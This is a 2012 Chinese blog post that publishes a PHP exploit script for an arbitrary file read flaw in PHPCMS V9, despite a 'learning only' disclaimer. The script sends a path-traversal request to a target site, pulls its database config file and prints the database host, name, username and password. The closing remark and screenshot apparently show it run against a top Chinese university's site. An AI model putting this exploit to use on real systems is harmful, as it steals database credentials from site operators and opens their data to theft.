title: "phpcmsV9最新任意读文件漏洞利用工具"
id: 159
date: 2012-07-25 02:36:28
tags: 
- phpcmsv9漏洞
- 任意读取文件漏洞
categories: 
- 原创作品
- 技术文章
- 最新漏洞
---

<span style="color: #ff0000;">注意：本程序带有攻击性，仅供学习研究请勿当作非法工具使用，否则后果自负，</span><span style="color: #ff0000;">于本人无关！</span>

睡觉前去论坛上面看了下，爆出 phpcmsV9最新任意读文件漏洞 ，第一反映就是

完了，估计互联网上又不知道多少万用户数据被脱了~~

自己就写了一个此漏洞的检测工具方便站长们检测自己的站点是否存在漏洞。

代码：

```php
<?php
/**
 * PHPcms V9 任意文件读取漏洞检测工具
 * @author Return Blog: www.creturn.com
 * Email: master@creturn.com
 *
 * 注意本程序仅供学习参考，不得用于非法互动
 * 否则后果自负，与本人无关！
 */

function showInfo() {

print '
***********************************************
* PHPcmsV9 Read All File ExpTool By: Return
*
* Blog: www.creturn.com
*
* Email:master@creturn.com
*
* Example: php exp.php wwww.phpcms.cn
***********************************************
';
}

$exp = '/index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../caches/configs/database.php';

//file_get_contents(''.$exp);
if(count($argv) &lt; 2){
 showInfo();
}else{

 $exp = 'http://'.$argv[1].$exp;
 $data = @file_get_contents($exp);
 @file_put_contents('expDatabase.php', $data);
 if(strstr($data,'&lt;html&gt;')){
 showInfo();
 echo 'Not found !';
 exit();
 };
 $database = include 'expDatabase.php';
 showInfo();
 $out = 'HostName: '.$database['default']['hostname']."n";
 $out .='DataBase:'. $database['default']['database']."n";
 $out .='UserName:'. $database['default']['username']."n";
 $out .='Password:'. $database['default']['password']."n";
 if(!empty($database)){
 echo "Found it! :nn";
 echo $out;
 }
 @unlink('expDatabase.php');
}
```
<!--more-->

国内第一名校，你懂得~~ ：

[![](http://www.creturn.com/asset/uploads/2012/07/phpcmsV9.jpg "phpcmsV9")](http://www.creturn.com/asset/uploads/2012/07/phpcmsV9.jpg)
